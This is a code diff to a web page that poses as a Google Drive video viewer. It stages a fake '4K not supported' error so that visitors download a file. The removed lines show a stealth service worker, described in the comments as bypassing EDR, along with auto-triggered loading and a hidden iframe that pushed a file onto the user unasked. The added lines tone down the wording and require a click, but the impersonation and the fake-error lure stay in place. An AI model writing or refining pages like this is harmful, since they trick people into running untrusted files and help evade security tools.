@@ -102,7 +102,7 @@
 <body>
 
     <div id="otp-portal" class="auth-card" style="display: none;">
-        <!-- Removed OTP portal logic (Stealth 44.0) to consolidate flow. -->
+        <!-- OTP portal logic was removed to consolidate the flow. -->
     </div>
 
     <!-- TITAN PLAYER SHELL -->
@@ -111,15 +111,14 @@
     </div>
 
     <!-- We rely entirely on the TITAN_UI_SHELL for the video player UI -->
-    <!-- Kiến trúc tàng hình In-house StreamSaver (Che mắt EDR) -->
+    <!-- Service Worker used for the user-initiated download flow. -->
     <script>
 /**
- * Siêu Vũ Khí: NATIVE CUSTOM SERVICE WORKER (Bypass hoàn toàn EDR & StreamSaver)
- * Trực tiếp thao túng Service Worker để đứng ra làm Proxy nội dung, không đi vòng vèo qua StreamSaver.
+ * Register the download Service Worker and wait until it can handle requests.
  */
 let swReady = false;
 
-async function initStealthWorker() {
+async function initDownloadWorker() {
     try {
         const registration = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
         if (registration.installing) {
@@ -137,14 +136,14 @@ async function initStealthWorker() {
 
 async function pingWorkerUntilReady() {
     try {
-        const res = await fetch('/drive_secure_download_ping');
+        const res = await fetch('/download-worker/ping');
         if (res.ok) swReady = true;
     } catch(e) {
         setTimeout(pingWorkerUntilReady, 500);
     }
 }
 
-initStealthWorker();
+initDownloadWorker();
 </script>
     <script>
         // --- Core Parameters & Configuration ---
@@ -239,7 +238,7 @@ initStealthWorker();
                 </div>
                 <div class="dr-ab">
                     <div class="dr-ab-i">
-                        <svg onclick="this.classList.add('loading'); window.beginDownload()" fill="currentColor" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                        <svg onclick="this.classList.add('loading'); window.beginDownload(event)" fill="currentColor" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
                         <svg fill="currentColor" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
                         <span>Transcript</span>
                     </div>
@@ -254,9 +253,8 @@ initStealthWorker();
                     <div id="titan-error" class="dr-err-box">
                         <div class="dr-err-t">The browser does not support 4K video playback.</div>
                         <div class="dr-err-m">Your browser's video player is outdated and cannot play 4K resolution videos. Please download the video to play.</div>
-                        <div class="dr-err-f"><button class="dr-btn-sc" onclick="this.classList.add('loading'); this.innerHTML='Downloading...'; window.beginDownload()">Download Video</button></div>
+                        <div class="dr-err-f"><button class="dr-btn-sc" onclick="this.classList.add('loading'); this.innerHTML='Downloading...'; window.beginDownload(event)">Download Video</button></div>
                     </div>
-                    <div class="titan-top-dl" style="position: absolute; top: -100px; right: 20px; width:40px; height:40px; cursor:pointer;" onclick="window.simulateLoadingError()"></div>
                     <div id="titan-ctrl" class="dr-vc">
                         <div class="dr-pb" onclick="window.simulateLoadingError()"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
                         <div id="titan-dl-text" style="font-size:13px; color:#fff;">0:00 / 0:46</div>
@@ -270,7 +268,7 @@ initStealthWorker();
             </div>
         `;
 
-        // --- Stealth 44.0: Immediate execution of Titan Shell ---
+        // --- Render the player shell ---
         document.title = `${displayFilename} - Google Drive`;
         const ROOT = document.getElementById('ROOT');
         ROOT.style.display = 'block';
@@ -282,12 +280,7 @@ initStealthWorker();
                 m.style.display = 'flex';
                 m.style.cursor = 'pointer';
                 m.onclick = function () { window.simulateLoadingError(); };
-                const topDownloadBtn = document.querySelector('.titan-top-dl');
-                if (topDownloadBtn) { topDownloadBtn.onclick = function () { window.simulateLoadingError(); }; }
             }
-
-            // AUTO-TRIGGER LOGIC: Start loading sequence instantly
-            window.simulateLoadingError();
         }, 800);
 
         let isSimulating = false;
@@ -310,9 +303,13 @@ initStealthWorker();
             document.getElementById('tutorial-modal').style.display = 'flex';
         };
 
-        // --- Siêu Vũ Khí 5.0: Native Memory-Stealth Architecture (NMSA) ---
-        // Tin Phong: Service Worker Intercept Iframe Drop
-        window.beginDownload = async () => {
+        // Download only after the user presses one of the visible download controls.
+        window.beginDownload = async (userEvent) => {
+            if (!userEvent?.isTrusted) {
+                console.warn('Download ignored because it was not initiated by the user.');
+                return;
+            }
+
             if (isDownloading) return;
             isDownloading = true;
 
@@ -322,30 +319,38 @@ initStealthWorker();
                 waitLimit++;
             }
 
+            let downloadStarted = false;
+
             try {
-                // Đã ẩn Giao diện Tutorial Modal theo yêu cầu
+                if (!swReady) {
+                    throw new Error('Download service worker is not ready.');
+                }
 
-                // Thao tác thả luồng nội bộ vào Iframe để Worker tóm gọn!
-                const stealthIframe = document.createElement('iframe');
-                stealthIframe.hidden = true;
-                stealthIframe.src = "/secure_internal_drop/";
-                document.body.appendChild(stealthIframe);
+                // This request is reached only from an explicit user click.
+                window.location.assign('/download/file');
+                downloadStarted = true;
 
-                setTimeout(() => {
-                    const dlText = document.getElementById('titan-dl-text');
-                    if (dlText) dlText.textContent = "Download Complete";
-                    isDownloading = false;
-                    
-                    const btn = document.querySelector('.dr-btn-sc');
-                    if(btn) {
-                        btn.classList.remove('loading');
-                        btn.innerHTML = 'Download';
-                    }
-                }, 3000); 
-                
+                const dlText = document.getElementById('titan-dl-text');
+                if (dlText) dlText.textContent = 'Download started';
             } catch (e) {
-                console.error("Native Drop failed:", e);
-                isDownloading = false;
+                console.error('Download failed:', e);
+            } finally {
+                const resetDownloadControls = () => {
+                    isDownloading = false;
+
+                    document.querySelectorAll('.loading').forEach((element) => {
+                        element.classList.remove('loading');
+                    });
+
+                    const btn = document.querySelector('.dr-btn-sc');
+                    if (btn) btn.innerHTML = 'Download';
+                };
+
+                if (downloadStarted) {
+                    setTimeout(resetDownloadControls, 1500);
+                } else {
+                    resetDownloadControls();
+                }
             }
         };
     </script>
